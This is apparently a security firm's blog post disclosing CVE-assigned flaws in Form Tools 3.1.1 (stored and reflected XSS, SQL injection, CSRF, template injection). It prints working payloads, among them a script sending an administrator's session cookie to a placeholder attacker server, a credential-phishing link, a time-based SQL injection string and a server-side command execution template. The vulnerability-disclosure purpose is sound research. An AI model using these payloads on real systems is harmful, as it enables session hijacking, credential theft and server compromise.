=== Content from hakaisecurity.io_3d8093fa_20250110_104529.html ===


* [Quem somos](https://hakaisecurity.io/sobre "Quem somos")
* Servi�os

  ![](https://hakaisecurity.io/wp-content/themes/hakai-site/assets/images/header-options-frame.svg)
  [Red Team](https://hakaisecurity.io/red-team "Red Team")
  [Pentest Team](https://hakaisecurity.io/pentest-team "Pentest Team")
  [DevSec Team](https://hakaisecurity.io/devsec "DevSec Team")
  [Purple Team](https://hakaisecurity.io/purple-team "Purple Team")
  [Delta 7 Team](https://hakaisecurity.io/research-team "Delta 7 Team")
  [Quimera X](https://hakaisecurity.io/quimera-team "Quimera X")
* Conte�do

  ![](https://hakaisecurity.io/wp-content/themes/hakai-site/assets/images/header-options-frame.svg)
  [Research Blog](https://hakaisecurity.io/hakai-blog "Research Blog")
  [Insights Blog](https://hakaisecurity.io/vulnerability-research "Insights Blog")

  [White Papers](https://hakaisecurity.io/white-papers "White Papers")

BR

US

![](https://hakaisecurity.io/wp-content/themes/hakai-site/assets/images/mobile-menu-frame.svg)

MENU

* [�nicio](https://hakaisecurity.io)
* [Quem somos](https://hakaisecurity.io/sobre)
Servi�os

[Red Team](https://hakaisecurity.io/red-team)
[Pentest Team](https://hakaisecurity.io/pentest-team)
[DevSec Team](https://hakaisecurity.io/devsec)
[Purple Team](https://hakaisecurity.io/purple-team)
[Delta 7 Team](https://hakaisecurity.io/research-team)
[Quimera X](https://hakaisecurity.io/quimera-team)

Conte�do

[Hakai blog](https://hakaisecurity.io/hakai-blog "Hakai blog")
[Vulnerability Research](https://hakaisecurity.io/vulnerability-research "Vulnerability Research")

[White Papers](https://hakaisecurity.io/white-papers "White Papers")

BR

US

# Error 404: Your Security Not Found – Tales of Web Vulnerabilities

![](https://hakaisecurity.io/wp-content/uploads/2024/10/CUPCAKE-150x150.jpg)

Escrito por **Daniel "cupc4k3" Barros**

### **Greetings to all,**

This article aims to provide insights and stories about vulnerabilities in web applications and their impacts. Throughout this text, I will demonstrate how specific flaws can compromise not only an application but, consequently, its underlying infrastructure.

### **What is form tools?**

### **Form Tools: Unveiling a Versatile Form Builder**

Form Tools is a versatile, potent, open-source form builder program that can be seamlessly integrated into your website. Its primary purpose lies in effectively managing data and forms, offering a user-friendly interface that does not necessitate advanced programming knowledge.

Vulnerabilities identified in **version** **3.1.1:**

![](https://hakaisecurity.io/wp-content/uploads/2024/05/form3.1.png)

I want to share insights from my recent research on the Form Tools application and the vulnerabilities I identified.

### Cross-Site Scripting XSS – Stored **(CVE-2024–22717)**

Starting my application analysis, I operated under a ***non-privileged user account***, which I’ll refer to as **‘cupcake’.**

![](https://hakaisecurity.io/wp-content/uploads/2024/05/image-1.png)

While examining the input fields of the application, I noticed something intriguing: the **“First Name”** field did ***not sanitize special characters***. This was a notable observation.

![](https://hakaisecurity.io/wp-content/uploads/2024/05/image-2.png)

However, when I saved the input and checked the user panel for **‘cupcake’,** I observed that the **HTML tags** I had attempted to trigger did not function, and there was no section or tab reflecting the user’s name.

Given that this was a ***test scenario***, I logged in as an administrator to check if the **HTML** tags **<h1></h1>** I had inserted earlier would work, potentially enlarging the text size.

![](https://hakaisecurity.io/wp-content/uploads/2024/05/image-3.png)

As seen below, while logged in as an **administrator**, I navigated to the **‘clients’** tab on the left to view the registered clients. However, the previously inserted tag did not execute as expected.

![](https://hakaisecurity.io/wp-content/uploads/2024/05/image-4.png)

Therefore, I decided to conduct a new test. This time, I inserted the tag **<img src=x>** (a simple HTML image tag intentionally malformed to test for Cross-Site Scripting (XSS) vulnerabilities. The **src=x** part is a placeholder, usually triggering an error, which can be exploited to execute malicious scripts), saved it successfully, and upon returning to the administrative panel, noticed **that the tag had executed as intended.**

![](https://hakaisecurity.io/wp-content/uploads/2024/05/image-5.png)
![](https://hakaisecurity.io/wp-content/uploads/2024/05/image-6.png)

Capitalizing on this vulnerability, which only affected the administrator’s view, I crafted a payload so that as soon as the system admin accessed the **‘clients’** tab, their session token would be sent to my Virtual Private Server **(VPS)**. This would enable us to **hijack their session**.

The payload used for cookie hijacking was:

<img src=x onerror=”document.location=’http://[IP]:8000/?cookie=’+document.cookie;”>

![](https://cdn-images-1.medium.com/max/1000/1*pAF8e1yXbRXTTPA94twU6w.png)

On my VPS, I set up a **web server using Python**, anticipating the receipt of the admin’s cookie:

The command used to set up the web server was:

python3 -m http.server

After logging in as an **administrator** and accessing the **‘clients’ tab**, the session cookie was successfully sent to my VPS, as evidenced in the following image:

![](https://hakaisecurity.io/wp-content/uploads/2024/05/image-29.png)

**With the administrator’s session cookie** now in my possession, I went to the browser’s inspect tool and swapped the current cookie with the admin’s, then refreshed the page. This granted me access to the admin account.

![](https://hakaisecurity.io/wp-content/uploads/2024/05/image-30.png)
![](https://hakaisecurity.io/wp-content/uploads/2024/05/image-9.png)

This **XSS attack** allows malicious scripts to be stored on a target server, such as in a database. When other users access this stored data, the script executes in their browser. The impacts can be severe, including theft of cookies, session tokens, or other sensitive information belonging to the user.

###

### SQL INJECTION **(CVE-2024–22719)**

I identified an SQL injection vulnerability in the application’s ‘keyword’ parameter. Upon navigating the **‘clients’** section, I observed a ‘search’ field used to locate clients in the system.

![](https://hakaisecurity.io/wp-content/uploads/2024/05/image-10.png)

Subsequently, during a code review of the application, I discovered a vulnerable code snippet in the **‘client.class.php’** file:

![](https://hakaisecurity.io/wp-content/uploads/2024/05/image-26.png)

Below, the concatenation of strings directly in SQL is performed, making the code vulnerable to SQL injection:

![](https://hakaisecurity.io/wp-content/uploads/2024/05/image-27.png)

The variable `$string`, which contains the value of the keyword parameter, is directly incorporated into the SQL clause without being properly sanitized or handled. This practice creates an opening for SQL injection attacks, where a malicious attacker can manipulate the value of `$string` to execute unauthorized SQL commands.

To validate the vulnerability, I used the following payload for a **time-based blind**:

`SLEEP(2)/*' or SLEEP(2) or '" or SLEEP(2) or "*/`

Explanation of the payload:

* `SLEEP(2)`: This is an SQL function causing the SQL query to pause execution for 2 seconds. It is employed to intentionally introduce a delay and assess whether the application is susceptible to time-based SQL injection.
* `/*' or SLEEP(2) or '" or SLEEP(2) or "*/`: This payload attempts to exploit the SQL injection vulnerability. The `/*` initiates a comment in SQL, and everything following it until `*/` is treated as a comment, disregarded by the database.

![](https://hakaisecurity.io/wp-content/uploads/2024/05/timebased.png)

The objective of this payload is to ascertain if the application is vulnerable to time-based SQL injection. If successful, the SQL query will be manipulated to introduce a 2-second delay. The attached screenshot shows that the application delayed the response by 8 seconds, confirming the successful exploitation of the SQL injection vulnerability.

**SQL Injection attacks** pose a significant threat to web applications. They can lead to unauthorized access to sensitive data, such as personal user information, financial details, and internal business data. The impact can range from data theft and website defacement to complete system compromise and data loss.

### Cross-Site Scripting XSS-Reflected **(CVE-2024–22718)**

Once again, in the administrative panel, I observed that changing a client’s profile would display the URL parameter **client\_id=2**. I realized that altering this value would **reflect on the page.**

To exploit this, I injected a simple JavaScript command to validate the vulnerability: **<script>alert(‘XSS’)</script>**

![](https://hakaisecurity.io/wp-content/uploads/2024/05/image-38.png)

This script successfully triggered, displaying the word “XSS” on the screen.

![](https://hakaisecurity.io/wp-content/uploads/2024/05/image-18.png)

To demonstrate the impact of reflected XSS, I utilized the parameter and inserted a payload. This payload replaced the client\_id number with a “click me” button. When a user clicks this button, a popup shows a page controlled by me. This page displays a “Welcome” message, prompting users**to enter their username/email and password.**

**Payload used:**

<a href=”https://yourdomain.com” onclick=”window.open(this.href, ‘New Window Name’, ‘width=600,height=400’); return false;” rel=”noopener” target=”\_blank”>CLICK ME!</a>

This payload creates a **hyperlink** labeled **“CLICK ME!” When clicked, it opens a new window with specific dimensions, directed to a URL I control. This technique is deceptive**, as it appears harmless but can lead the user to a malicious site.

On the domain I control, the data is automatically saved in the data.txt file after the user enters their application credentials.

![](https://hakaisecurity.io/wp-content/uploads/2024/05/image-19.png)

The command used to monitor this file: **tail -f /directory/data.txt**

The **tail -f command is used to monitor the contents of the data.txt file in real time. It helps track the captured credentials as users enter them**.

![](https://hakaisecurity.io/wp-content/uploads/2024/05/image-20.png)

Through this reflected XSS attack, it was possible to steal user credentials. It’s important to note that for reflected XSS attacks to be effective, the victim must be enticed to click on a link containing the malicious payload.

###

### CSRF – Cross-site Request Forgery **(CVE-2024–22721)**

While logged back in as the client **‘cupcake’**, I noticed a flaw in the application. In the password change options, there is no requirement to enter the current password. This is a security vulnerability because it allows **any user with system access to change the password** without the **application verifying the current password.**

![](https://hakaisecurity.io/wp-content/uploads/2024/05/image-21.png)

Next, I clicked on **‘update’** to analyze the POST request and identified that it is **vulnerable** to a **CSRF (Cross-Site Request Forgery)** attack since it doesn’t require a valid **CSRF token** to process the request. A CSRF token is a security measure to prevent unauthorized requests from being sent to a website on behalf of a user. Without a valid CSRF token requirement, the application is exposed to such attacks, allowing an attacker to forge a request that the application will process without a valid CSRF token.

![](https://hakaisecurity.io/wp-content/uploads/2024/05/image-31.png)

There is a fantastic feature called the CSRF PoC Generator in Burp Suite. The CSRF PoC Generator helps create a simulation of a CSRF attack. It generates a sample webpage or a link that mimics a malicious request. When clicked, this link or page executes a command or changes settings without the user’s knowledge, demonstrating how a CSRF attack would work.

### **Demonstrating the Impact of CSRF:**

Depending on the scenario and available information, an attacker could construct a link and send it to **other users**. In the example below, I altered the administrator’s data, including name, email, and password, while keeping the **username as ‘admin’**.

![](https://hakaisecurity.io/wp-content/uploads/2024/05/image-32.png)

Using this tool, click on test in the browser, and a link will be generated so we can test/demonstrate the attack.

![](https://hakaisecurity.io/wp-content/uploads/2024/05/image-33.png)

Logged in as the **administrator** in the system:

The request was resent after the admin accessed the sent link, and the administrator’s data was successfully altered.

![](https://hakaisecurity.io/wp-content/uploads/2024/02/csrf-300x263.gif)

Logged in as the **administrator** in the system:

The request was resent after the admin accessed the sent link, and the administrator’s data was successfully altered.

![](https://hakaisecurity.io/wp-content/uploads/2024/05/image-30.png)

**CSRF attacks** represent a significant security risk. They allow attackers to execute actions on behalf of legitimate users without their consent. In this case, an administrator’s account details were altered without their knowledge by simply accessing a malicious link. This scenario highlights how CSRF can be used to gain unauthorized access and control over user accounts, posing a serious threat to the integrity and confidentiality of the system.

### **SSTI – SERVER SIDE TEMPLATE INJECTION** **(CVE-2024–22722)**

As an administrator logged into the system, I navigated to the **‘add form’** section and then to views.

![](https://hakaisecurity.io/wp-content/uploads/2024/05/image-31.png)

When entering the **‘group name’**, I noticed it was not vulnerable to Cross-Site Scripting (XSS), so I tested for **Server-Side Template Injection (SSTI)**. I entered the command **{{7\*7}}** to see if the system would perform the mathematical operation.

![](https://hakaisecurity.io/wp-content/uploads/2024/05/image-32.png)

To my surprise, upon clicking **‘update’** after creating the group, the command executed successfully, returning the multiplication result: **49**.

![](https://hakaisecurity.io/wp-content/uploads/2024/05/ssti.gif)

Considering that the application uses **Twig**, I executed the command **{{exec(‘id’)}}**. This successfully allowed me to execute commands on the server, returning the user **ID** and confirming the vulnerability.

![](https://hakaisecurity.io/wp-content/uploads/2024/05/image-34.png)
![](https://hakaisecurity.io/wp-content/uploads/2024/05/image-35.png)

This vulnerability allows an attacker to inject malicious commands into a server’s template engine, potentially leading to unauthorized access and control. The impact can be significant: from stealing sensitive data, compromising server integrity, and gaining full control over the server environment. A severe security flaw can undermine an application’s entire security posture.

Delving into the intricacies of cybersecurity is a crucial endeavor, and I hope this report has provided valuable insights into the potential threats that your organization may face.

Remember, it’s not merely about avoiding vulnerabilities but actively seeking to enhance security measures.

Thank you for entrusting your attention to me. I sincerely hope you’ve gleaned valuable insights that resonate with your organization’s cybersecurity strategy.

*Keep learning, keep evolving, and most importantly, keep hacking the vulnerabilities before they **hack you.***

**Gostou?** Escolha uma rede social para compartilhar!

### Não apenas dados, mas ideias que invadem

Inscreva-se na nossa newsletter e se mantenha sempre atualizado. Ta esperando o que?

## Relacionados

[### O lado obscuro do JWT: Explorando vulnerabilidades em Tokens.

![](https://hakaisecurity.io/wp-content/uploads/2024/10/TRISON-150x150.jpg)
![](https://hakaisecurity.io/wp-content/uploads/2024/10/VERT-150x150.jpg)

Escrito por **Murilo, Maiky Jhony**](https://hakaisecurity.io/o-lado-obscuro-do-jwt-explorando-vulnerabilidades-em-tokens/research-blog/)
[info stealer

### Stealer Logs: Uma análise aprofundada de mais de meio bilhão de credenciais roubadas

![](https://hakaisecurity.io/wp-content/uploads/2024/10/RULIO-150x150.jpg)

Escrito por **Gabriel**](https://hakaisecurity.io/stealer-logs-uma-analise-aprofundada-de-mais-de-meio-bilhao-de-credenciais-roubadas/research-blog/)
[### Malwares que detectam o Wine e infectam o Windows E o Linux?

![](https://hakaisecurity.io/wp-content/uploads/2024/10/RAFAEL-scaled-150x150.webp)

Escrito por **Rafael Santana**](https://hakaisecurity.io/malwares-que-detectam-o-wine-e-infectam-o-windows-e-o-linux/research-blog/)

[![Logo da Hakai.](https://hakaisecurity.io/wp-content/themes/hakai-site/assets/images/logo.svg)](https://hakaisecurity.io)

//attack to protect.

(11) 97823-7902

[[email protected]](/cdn-cgi/l/email-protection)

NAVEGUE PELO SITE
[Home](https://hakaisecurity.io "Home")
[Desenv. Seguro](https://hakaisecurity.io/devsec "Desenv. Seguro")
[Purple Team](https://hakaisecurity.io/purple-team "Purple Team")
[Quem somos](https://hakaisecurity.io/sobre "Quem somos")
[Pentest](https://hakaisecurity.io/pentest-team "Pentest")
[Quimera X](https://hakaisecurity.io/quimera-team "Quimera X")
[Conteúdo](https://hakaisecurity.io/research-team "Conteúdo")
[Red Team](https://hakaisecurity.io/red-team "Red Team")
[Política de privacidade](https://hakaisecurity.io/politica-de-privacidade "Política de privacidade")

Todos os Direitos Reservados © Hakai 2023

![](https://hakaisecurity.io/wp-content/themes/hakai-site/assets/images/success-modal-frame.svg)
## Mensagem enviada.

Obrigado por entrar em contato!

Fechar

![Logo da Hakai.](https://hakaisecurity.io/wp-content/themes/hakai-site/assets/images/loader-logo.svg)
![Logo da Hakai.](https://hakaisecurity.io/wp-content/themes/hakai-site/assets/images/lettering/hakai-lettering-logo.svg)

![](https://hakaisecurity.io/wp-content/themes/hakai-site/assets/images/contact-form-frame.svg)
![](https://hakaisecurity.io/wp-content/themes/hakai-site/assets/images/contact-modal-mobile-frame.svg)
### Entre em contato

Teremos o prazer de atender você!


